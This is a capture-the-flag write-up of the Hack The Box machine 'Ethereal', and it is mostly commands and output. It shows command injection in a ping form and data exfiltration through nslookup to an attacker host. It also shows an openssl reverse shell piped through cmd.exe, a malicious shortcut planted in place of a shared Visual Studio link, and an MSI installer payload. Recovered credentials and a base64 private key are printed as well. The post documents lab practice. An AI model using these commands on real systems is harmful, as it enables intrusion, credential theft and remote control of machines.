---
layout: post
title: Hackthebox Ethereal Writeup
categories: HackTheBox
---

<img src="/public/images/2019-03-22/ethereal_badge.png"><br>
## Environment
* Host OS: Kali linux 2018.4
* Guest OS: Windows 7 Service Pack 1
* Virtualization: Virtualbox 5.2.22
* MSI builder: Wix Toolset v3.11.1

## Explanation:
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of "Ethereal".

## Solution:
### 1. Initial Enumeration
TCP Port scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.106 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-07 19:56 EET
Stats: 0:20:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 75.77% done; ETC: 20:23 (0:06:33 remaining)
Nmap scan report for 10.10.10.106
Host is up (0.12s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ethereal
8080/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1628.08 seconds
{% endhighlight %}

FTP enumeration:
{% highlight shell %}
root@kali:~# ftp 10.10.10.106
Connected to 10.10.10.106.
220 Microsoft FTP Service
Name (10.10.10.106:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-10-18  09:03PM       <DIR>          binaries
09-02-09  08:58AM                 4122 CHIPSET.txt
01-12-03  08:58AM              1173879 DISK1.zip
01-22-11  08:58AM               182396 edb143en.exe
01-18-11  11:05AM                98302 FDISK.zip
07-10-18  08:59PM       <DIR>          New folder
07-10-18  09:38PM       <DIR>          New folder (2)
07-09-18  09:23PM       <DIR>          subversion-1.10.0
11-12-16  08:58AM                 4126 teamcity-server-log4j.xml
226 Transfer complete.
{% endhighlight %}

gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.106 -x aspx

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.106/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : aspx
[+] Timeout      : 10s
=====================================================
2019/03/07 20:28:10 Starting gobuster
=====================================================
/default.aspx (Status: 200)
/Default.aspx (Status: 200)
/corp (Status: 301)
/Corp (Status: 301)
/DEFAULT.aspx (Status: 200)
/CORP (Status: 301)
=====================================================
2019/03/07 22:21:57 Finished
=====================================================
{%endhighlight %}

gobuster HTTP /corp:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.106/corp -x aspx

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.106/corp/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Extensions   : aspx
[+] Timeout      : 10s
=====================================================
2019/03/07 22:32:06 Starting gobuster
=====================================================
/img (Status: 301)
/login (Status: 301)
/help (Status: 301)
/css (Status: 301)
/Help (Status: 301)
/Login (Status: 301)
/js (Status: 301)
/console (Status: 301)
/IMG (Status: 301)
/CSS (Status: 301)
/Img (Status: 301)
/JS (Status: 301)
/Console (Status: 301)
/HELP (Status: 301)
/LogIn (Status: 301)
/LOGIN (Status: 301)
=====================================================
2019/03/08 00:27:06 Finished
=====================================================
{%endhighlight %}

### 2. Getting User

As always, try to enumerate HTTP.<br>
If we click on "MENU", we can find an access to admin console.
![placeholder](https://inar1.github.io/public/images/2019-03-22/2019-03-20-11-25-03.png)

Clicking on "Menu" again and "PING" redirects us to ethreal.htb:8080.<br>
We have to add following line in "/etc/hosts".
{% highlight shell %}
10.10.10.106 ethereal.htb
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-03-22/2019-03-09-17-35-42.png)
![placeholder](https://inar1.github.io/public/images/2019-03-22/2019-03-20-11-27-17.png)

However, since we don't have any credentials right now, continue our enumeration.<br>

By FTP enumeration, We could find some interesting zip files.<br>
The content of these zip files don't have any extensions.

{% highlight shell %}
root@kali:~# unzip DISK1.zip
Archive:  DISK1.zip
  inflating: DISK1
  inflating: DISK2
root@kali:~# unzip FDISK.zip
Archive:  FDISK.zip
  inflating: FDISK
{%endhighlight %}

By executing file command, we can figure out these are disk images.
{% highlight shell %}
root@kali:~# file DISK1
DISK1: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", root entries 224, sectors 2880 (volumes <=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x8c271e81, unlabeled, FAT (12 bit), followed by FAT
root@kali:~# file DISK2
DISK2: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", root entries 224, sectors 2880 (volumes <=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x8c271fb9, unlabeled, FAT (12 bit), followed by FAT
root@kali:~# file FDISK
FDISK: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "MSDOS5.0", root entries 224, sectors 2880 (volumes <=32 MB), sectors/FAT 9, sectors/track 18, serial number 0x5843af55, unlabeled, FAT (12 bit), followed by FAT
{%endhighlight %}

If we check labels of each disk image, only "FDISK" has label "PASSWORDS".

{% highlight shell %}
root@kali:~# e2label FDISK
e2label: Bad magic number in super-block while trying to open FDISK
FDISK contains a vfat file system labelled 'PASSWORDS'
{%endhighlight %}

To enumerate disk image, we have to mount the image file.<br>
There is a directory "pbox" and
{% highlight shell %}
root@kali:~# mount -o loop FDISK /mnt/
root@kali:~# tree /mnt/
/mnt/
└── pbox
    ├── pbox.dat
    └── pbox.exe

1 directory, 2 files
{%endhighlight %}

We found 1 executable and 1 dat file.<br>
Spin up a new windows VM with Virtualbox and try to execute it(wine didn't work for me).<br>
![placeholder](https://inar1.github.io/public/images/2019-03-22/2019-03-20-13-40-27.png)

It asked password but the password was easily guessable "password".<br>
Seeing each entry of pbox.exe, we can gather some interesting "credentials".
![placeholder](https://inar1.github.io/public/images/2019-03-22/2019-03-20-13-40-45.png)

List:
{% highlight shell %}
root@kali:~# cat strings.txt 
7oth3B@tC4v3!
alan@ethereal.co / P@ssword1!
alan2 / leaning!
watch3r
alan / Ex3cutiv3Backups
R3lea5eR3@dy#
Password8
!C414m17y57r1k3s4g41n!
alan53 / Ch3ck1ToU7
{%endhighlight %}

Try each patterns and we can find following credential to login ethereal.htb:8080
{% highlight shell %}
alan:!C414m17y57r1k3s4g41n!
{%endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-03-22/2019-03-20-13-42-22.png)

Sounds like "ping" command is executed internally.<br>
Then, try OS command injection by putting some windows OS command in the textbox and submit.<br>
We can easily figure out this command is available.
{% highlight shell %}
127.0.0.1 & ping 10.10.14.23
{%endhighlight %}

We can confirm the result by tcpdump
{% highlight shell %}
root@kali:~# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
18:51:03.070436 IP ethereal.htb > kali: ICMP echo request, id 1, seq 17, length 40
18:51:03.070476 IP kali > ethereal.htb: ICMP echo reply, id 1, seq 17, length 40
18:51:04.222480 IP ethereal.htb > kali: ICMP echo request, id 1, seq 18, length 40
18:51:04.222522 IP kali > ethereal.htb: ICMP echo reply, id 1, seq 18, length 40
18:51:05.231877 IP ethereal.htb > kali: ICMP echo request, id 1, seq 19, length 40
18:51:05.231910 IP kali > ethereal.htb: ICMP echo reply, id 1, seq 19, length 40
18:51:06.875927 IP ethereal.htb > kali: ICMP echo request, id 1, seq 20, length 40
18:51:06.875966 IP kali > ethereal.htb: ICMP echo reply, id 1, seq 20, length 40
{%endhighlight %}

To send some information, we can enter following command and to receive it, responder is available.
{% highlight shell %}
127.0.0.1 & nslookup test 10.10.14.23
{%endhighlight %}

{% highlight shell %}
root@kali:~# responder -I tun0

~~~

[+] Listening for events...
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .test
{%endhighlight %}

We can try to execute os command and its output by following command.
{% highlight shell %}
# 10.10.14.23 & for /f %i in ('whoami') do nslookup %i 10.10.14.23
[+] Listening for events...
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .etherealalan
{%endhighlight %}

From now on, we can proceed our enumeration.<br>
For example, current directory is "C:\windows\system32\inetsrv"
{% highlight shell %}
# 10.10.14.23 & for /f %i in ('cd') do nslookup %i 10.10.14.23
[+] Listening for events...
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .c.windowssystem32inetsrv
{%endhighlight %}

User enumeration:
{% highlight shell %}
# 10.10.14.23 & for /f %i in ('dir /B "C:\Users"') do nslookup %i 10.10.14.23
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Administrator
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .alan
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .jorge
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Public
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .rupal
{%endhighlight %}

Installed Program enumeration:
{% highlight shell %}
# 10.10.14.23 & for /f %i in ('dir /B "C:\Program Files (x86)"') do nslookup %i 10.10.14.23
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Common
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Internet
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Microsoft
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Microsoft
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Microsoft.NET
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .MSBuild
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .OpenSSL.v1.1.0
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Reference
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Windows
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Windows
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Windows
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Windows
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Windows
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Windows
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Windows
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .WindowsPowerShell
{%endhighlight %}

Interesting information is that we have openssl v1.1.0 installed.

{% highlight shell %}
# 10.10.14.23 & netsh advfirewall firewall show rule name=all | findstr "Rule Name:" > C:\Users\Public\Desktop\Shortcuts\fw.txt
# 10.10.14.23 & for /f %i in ('dir /B "C:\Users\Public\Desktop\Shortcuts"') do nslookup %i 10.10.14.23
# 10.10.14.23 & for /f "tokens=1,2,3,4,5,6,7,8" %a in ('type C:\users\public\desktop\shortcuts\fw.txt') do nslookup %a.%b.%c.%d.%e.%f.%g.%h 10.10.14.23
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Rule.Name.Allow.ICMP.Reply
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Rule.Name.Allow.ICMP.Request
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Rule.Name.Allow.UDP.Port.53
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Rule.Name.Allow.TCP.Ports.73.136
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Rule.Name.Allow.Port.80.8080
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Rule.Name.Allow.ICMP.Request
[*] [DNS] Poisoned answer sent to: 10.10.10.106     Requested name: .Rule.Name.Allow.ICMP.Reply
{%endhighlight %}

According to this information, we have 2 ports for connection 73, 136.<br>
Then, try to have a remote connection

{% highlight shell %}
root@kali:~# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
Generating a RSA private key
.................................................................................................................................++++
..........................++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
root@kali:~# ls -la 
-rw-r--r-- 1 root root 1939 Mar 10 13:25 cert.pem
-rw------- 1 root root 3272 Mar 10 13:24 key.pem
{% endhighlight %}

{% highlight shell %}
# 10.10.14.23 | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.14.23:73 | cmd.exe | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.14.23:136

root@kali:~# openssl s_server -quiet -key key.pem -cert cert.pem -port 73

Pinging 10.10.14.23 with 32 bytes of data:
Reply from 10.10.14.23: bytes=32 time=34ms TTL=63
Reply from 10.10.14.23: bytes=32 time=38ms TTL=63

Ping statistics for 10.10.14.23:
    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 34ms, Maximum = 38ms, Average = 36ms

root@kali:~# openssl s_server -quiet -key key.pem -cert cert.pem -port 136
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
{% endhighlight %}

After that, by writting a command on terminal port 73 and refrashing the page, we can execute our commands.

{% highlight shell %}
 Directory of C:\users\alan\desktop

07/07/2018  11:08 PM    <DIR>          .
07/07/2018  11:08 PM    <DIR>          ..
07/07/2018  11:07 PM               160 note-draft.txt
               1 File(s)            160 bytes
               2 Dir(s)  15,437,340,672 bytes free
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5
{% endhighlight %}

There is no user.txt in C:\Users\alan\desktop.<br>
However, there is an interesting text file.

{% highlight shell %}
c:\windows\system32\inetsrv>type C:\users\alan\desktop\note-draft.txt
I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.

- Alan

c:\windows\system32\inetsrv>dir C:\users\public\desktop\shortcuts
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5

 Directory of C:\users\public\desktop\shortcuts

03/10/2019  11:01 AM    <DIR>          .
03/10/2019  11:01 AM    <DIR>          ..
03/10/2019  11:02 AM             2,494 fw.txt
07/06/2018  02:28 PM             6,125 Visual Studio 2017.lnk
               2 File(s)          8,619 bytes
               2 Dir(s)  15,436,517,376 bytes free

{% endhighlight %}

To take advantage of this, create our payload to obtain other user shell.
We can use <a href="https://github.com/Plazmaz/LNKUp">LNKUp</a>.

{% highlight shell %}
root@kali:~/LNKUp# python generate.py --host localhost --type ntlm --out vs-mod.lnk --execute "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.23:73|cmd.exe|C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.23:136"
\
  ~==================================================~
##                                                    ##
##  /$$       /$$   /$$ /$$   /$$ /$$   /$$           ##
## | $$      | $$$ | $$| $$  /$$/| $$  | $$           ##
## | $$      | $$$$| $$| $$ /$$/ | $$  | $$  /$$$$$$  ##
## | $$      | $$ $$ $$| $$$$$/  | $$  | $$ /$$__  $$ ##
## | $$      | $$  $$$$| $$  $$  | $$  | $$| $$  \ $$ ##
## | $$      | $$\  $$$| $$\  $$ | $$  | $$| $$  | $$ ##
## | $$$$$$$$| $$ \  $$| $$ \  $$|  $$$$$$/| $$$$$$$/ ##
## |________/|__/  \__/|__/  \__/ \______/ | $$____/  ##
##                                         | $$       ##
##                                         | $$       ##
##                                         |__/       ##
  ~==================================================~

File saved to /root/LNKUp/vs-mod.lnk
Link created at vs-mod.lnk with UNC path \\localhost\Share\3910.ico.
{% endhighlight %}

After that, run the ssl server again which serves vs-mod.lnk.<br>
This does not output any message in the console but don't worry.
{% highlight shell %}
root@kali:~# openssl s_server -quiet -key key.pem -cert cert.pem -port 136 < vs-mod.lnk
# then, run following payload to upload shell on web ping console
# 10.10.14.23 | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.14.23:136 > "C:\Users\Public\Desktop\Shortcuts\vs-mod.lnk"
{% endhighlight %}

After that, we can confirm we have vs-mod.lnk in /shortcuts.
{% highlight shell %}
c:\windows\system32\inetsrv>dir c:\users\public\desktop\shortcuts
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5

 Directory of c:\users\public\desktop\shortcuts

03/10/2019  12:28 PM    <DIR>          .
03/10/2019  12:28 PM    <DIR>          ..
03/10/2019  11:02 AM             2,494 fw.txt
07/06/2018  02:28 PM             6,125 Visual Studio 2017.lnk
03/10/2019  12:26 PM               520 vs-mod.lnk
               3 File(s)          9,139 bytes
               2 Dir(s)  15,435,431,936 bytes free
{% endhighlight %}

Then, change the name of "vs-mod.lnk" to "Visual Studio 2017.lnk"
{% highlight shell %}
# put this command on openssl server serves port 73
del "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" & copy /Y "c:\users\public\desktop\shortcuts\vs-mod.lnk" "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" & dir c:\users\public\desktop\shortcuts

c:\windows\system32\inetsrv>dir c:\users\public\desktop\shortcuts
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5

 Directory of c:\users\public\desktop\shortcuts

03/10/2019  12:39 PM    <DIR>          .
03/10/2019  12:39 PM    <DIR>          ..
03/10/2019  11:02 AM             2,494 fw.txt
03/10/2019  12:26 PM               520 Visual Studio 2017.lnk
03/10/2019  12:26 PM               520 vs-mod.lnk
               3 File(s)          3,534 bytes
               2 Dir(s)  15,435,128,832 bytes free
{% endhighlight %}

After that, immediately rerun these servers again.<br>
A few minutes later, we can achieve user shell whose user is "jorge".<br>
The user.txt is as always in the directory of "desktop".

{% highlight shell %}
root@kali:~# openssl s_server -quiet -key key.pem -cert cert.pem -port 136
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\jorge\Documents>whoami
whoami
ethereal\jorge

C:\Users\jorge\Documents>type C:\Users\jorge\desktop\user.txt
2b9a4ca09408b4a39d87cbcd7bd524dd
{% endhighlight %}

### 3. Getting Root

If we check other device on Ethereal, we can find additional drive "D:\".
{% highlight shell %}
C:\Users\jorge\Documents>fsutil fsinfo drives

Drives: C:\ D:\

C:\Users\jorge\Documents>dir D:\
 Volume in drive D is Development
 Volume Serial Number is 54E5-37D1

 Directory of D:\

07/07/2018  09:50 PM    <DIR>          Certs
06/27/2018  10:30 PM    <DIR>          DEV
07/16/2018  09:54 PM    <DIR>          Program Files (x86)
06/30/2018  09:05 PM    <DIR>          ProgramData
               0 File(s)              0 bytes
               4 Dir(s)   8,437,514,240 bytes free
{% endhighlight %}

We can find an interesting note in D:\DEV\MSIs.
{% highlight shell %}
C:\Users\jorge\Documents>type D:\DEV\MSIs\note.txt
Please drop MSIs that need testing into this folder - I will review regularly. Certs have been added to the store already.

- Rupal
{% endhighlight %}

Sounds like we have to create a msi file which executes our payload.<br>
Beforehand, we need some certs to sign our msi file.<br>
We can find them in D:\Certs.
{% highlight shell %}
C:\Users\jorge\Documents>dir D:\certs
 Volume in drive D is Development
 Volume Serial Number is 54E5-37D1

 Directory of D:\certs

07/07/2018  09:50 PM    <DIR>          .
07/07/2018  09:50 PM    <DIR>          ..
07/01/2018  09:26 PM               772 MyCA.cer
07/01/2018  09:26 PM             1,196 MyCA.pvk
               2 File(s)          1,968 bytes
               2 Dir(s)   8,437,514,240 bytes free

C:\Users\jorge\Documents>C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in D:\Certs\MyCA.cer
MIIDADCCAeigAwIBAgIQIPZoDPLffoVFfuI8gqFGajANBgkqhkiG9w0BAQsFADAQ
MQ4wDAYDVQQDEwVNeSBDQTAeFw0xODA3MDEyMTI2MzlaFw0zOTEyMzEyMzU5NTla
MBAxDjAMBgNVBAMTBU15IENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
AQEAnc1wfJAWkLGTZkTOLPigFzO5Wp+4Q6DtGHO3SxHubY3ru3caRm8y4Y5LHtlY
jc9ZP5BStiYsVtnqzJY1H+SxweLPQvpHYjSC54ZpMEt1AHKhuE9o9+2qdfNonRtK
/xLa2qcov0prPPs9LTkde5xIWw7fplAmrpvkVf4yfgSrmactNLoZby/lnG+nhsT5
j4ICZIGogo+Icn/eTy7UPCdRdfkOdzAHBX6xQfH6g/p7HGtPigH9rs4ia1cND6J+
NuPAuuLlMxpbSYE5Q1Gq8sRKdYnTMK9RfLnxa+N78qqR8R/MYr/RR4lKr2klwQm4
jWno4wAlqirjW5W7LDmBOsstNQIDAQABo1YwVDAPBgNVHRMBAf8EBTADAQH/MEEG
A1UdAQQ6MDiAEKuZwosHXc04qkkMrVgOXvShEjAQMQ4wDAYDVQQDEwVNeSBDQYIQ
IPZoDPLffoVFfuI8gqFGajANBgkqhkiG9w0BAQsFAAOCAQEAaJWYGIP0vCruQ7WP
43P0vFuwCmSLUYM+Edz+kQGBifhBnNsU+klJ18TWwazRGE4c72oAF+gNCAvfFKIq
2pbGUWaKnPzEO0znCg4pgdEIGHjNTePYngL0h76ItFlGOr4YttOIROflpk1dR6Cp
/1PwEOxZZ/9Kr9h1GVDiz2vcQW2VA8ALcgY584SKUkuKhE8Mqao78hU87e4dgXQL
KkqlkMYo7XeFa5MYZpiXCQNQNQIp1l7wAiA6mdaURtG6+PSoLZel8101iXYQbZUn
FAAiPQJ0lYyqerYP1tXtoSGUUEquiZFif3iU3VGA57L2repPbNIqOSOEmd47ZXT5
K9WXgA==

C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in D:\Certs\MyCA.pvk
HvG1sAAAAAACAAAAAAAAAAAAAACUBAAABwIAAAAkAABSU0EyAAgAAAEAAQA1Lcs6
gTksu5Vb4yqqJQDj6GmNuAnBJWmvSolH0b9izB/xkarye+Nr8bl8Ua8w04l1SsTy
qlFDOYFJWxoz5eK6wOM2fqIPDVdrIs6u/QGKT2sce/qD+vFBsX4FBzB3Dvl1USc8
1C5P3n9yiI+CqIFkAoKP+cSGp2+c5S9vGbo0LaeZqwR+Mv5V5JuuJlCm3w5bSJx7
HTktPfs8a0q/KKfa2hL/ShudaPN1qu33aE+4oXIAdUswaYbngjRiR/pCz+LBseQf
NZbM6tlWLCa2UpA/Wc+NWNkeS47hMm9GGne7641t7hFLt3MY7aBDuJ9auTMXoPgs
zkRmk7GQFpB8cM2dcZKSZIFgfu9cfUwrnXbTQC2BzNdRgmJGHW+KXCFns7ve/Cfh
UUSEOwv+aZwivMWic+lUA3MbVE73k5SrWWAa8HfhyRGeVkClWynddhknlufRz3VT
owT8YoHrpOey+EJ48NX5kbb/lIL0qTzd4DtWbLDSI1oW+Cj3hiuQ1unQU7wF4Ukf
7jv7zghW6Bp6LoUBFd9Dxw0Irs/aVRPyLWKv1Smk7rdiZ+Ym6/upHuLBaak4L/rM
qvzeT+hoV9JkdOckXA54tEf0SYoamH2+mFwSgmenHjdHEPjKOC1FJOGacC/bKB4z
iw0AoLPAwoK+ld57HMo1mexAEfvwua3rT6WB1pHtuKszTcsw2llLlAk3C2OU8sJS
+XPjsy4564WZZJurWx10vlhPUpdKTGbF/QV+5b02FQiyR5HkWBtqKHRVyEdZB0l5
VFFUXWZBzYc//AqSfPZg19VcrGS2B8rU6oK/5dA4djw9oeYzpQDD5q6z/GlGrLCt
iwGht0fcUveev2+20QfAHkGMmK1l9ymFdABCxLxQ3RbsaRwFffzwIO7hICSjIPwP
8Lfl9SbLP1TqUhfmcWhDPNgBjvgI2HuiXOTOjqgo+ML8AP4t5ctAOV3idNqGA+8o
QfqbZIwXW8t3DhRMOQ+y+7kZAG+0Tl4W+64Z+WbpV5NQ4Lh5zSDmy0H3NookmLbM
k/+6gRKfzGSnvlxR8+yngqaJoCYziE/+F3k293lHyGz7swQ+/Pgn4VnKXJPJTHwM
Gh7npszdDimChYLZhdo8VKSPdIe1aBcwzlxWhKe8zU39ktBCVB6COH+X2rRlNXiv
vvvesEbLeD0y2vFxjWxCT1IcNMSe+NWLrRLVV1FlLtjTp+uIk8158Et7Mi5/i2h3
ic+SiTxnQceaA9VJHLXEp3yO7hKMEpH9amU41EtFVStmiRoO3S3Bv3gGmZNKxZGJ
aocRCf2Rc0AjRB2xbshYFx4hCpDPdXCZRzDIjJjxQEfl1rLxQqA5rz3/3K8SyJSL
S79t8hzxlqwZvuMkL8LJzJi4m9Bt9sc2IxMdka4oAHAvKNpoOi6fZKINibMP69xK
g7lubG3/Aft9LYH2DpSSt00WyPIqFIscvOqkzrBlJHW4Dj65gsdsBqKIvb0hdfpf
myOjgtyxIuox7xHZOTg0TjoOnw1oMAdlBLaDfRz91TDwdd5N6T83QXLy3gY=
{% endhighlight %}

#### Create a msi file
We can use <a href="http://wixtoolset.org/">Wix Toolset</a> to create a new msi file.<br>
At first, we have to prepare one xml which describes the msi file we create.
{% highlight shell %}
root@kali:~# cat ethereal.wxs 
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\vs-mod.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
{% endhighlight %}

Then, we have to execute following commands.
{% highlight shell %}
C:\Program Files\WiX Toolset v3.11\bin>candle.exe c:\tmp\ethereal.wxs
Windows Installer XML Toolset Compiler version 3.11.1.2318
Copyright (c) .NET Foundation and contributors. All rights reserved.

ethereal.wxs


C:\Program Files\WiX Toolset v3.11\bin>light.exe ethereal.wixobj
Windows Installer XML Toolset Linker version 3.11.1.2318
Copyright (c) .NET Foundation and contributors. All rights reserved.


c:\tmp\ethereal.wxs(6) : warning LGHT1079 : The cabinet 'product.cab' does not c
ontain any files.  If this installation contains no files, this warning can like
ly be safely ignored.  Otherwise, please add files to the cabinet or remove it.
c:\tmp\ethereal.wxs(10) : error LGHT0204 : ICE18: KeyPath for Component: 'Applic
ationFiles' is Directory: 'INSTALLLOCATION'. The Directory/Component pair must b
e listed in the CreateFolders table.
{% endhighlight %}

#### Sign the msi file
At first, we have to install <a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=8279">Windows SDK</a>.<br>
Then, we have to decode base 64 encoded .cer file and .pvk file.<br>
Decode MyCA.cer:
{% highlight shell%}
root@kali:~# cat MyCA.cer.b64 
MIIDADCCAeigAwIBAgIQIPZoDPLffoVFfuI8gqFGajANBgkqhkiG9w0BAQsFADAQ
MQ4wDAYDVQQDEwVNeSBDQTAeFw0xODA3MDEyMTI2MzlaFw0zOTEyMzEyMzU5NTla
MBAxDjAMBgNVBAMTBU15IENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
AQEAnc1wfJAWkLGTZkTOLPigFzO5Wp+4Q6DtGHO3SxHubY3ru3caRm8y4Y5LHtlY
jc9ZP5BStiYsVtnqzJY1H+SxweLPQvpHYjSC54ZpMEt1AHKhuE9o9+2qdfNonRtK
/xLa2qcov0prPPs9LTkde5xIWw7fplAmrpvkVf4yfgSrmactNLoZby/lnG+nhsT5
j4ICZIGogo+Icn/eTy7UPCdRdfkOdzAHBX6xQfH6g/p7HGtPigH9rs4ia1cND6J+
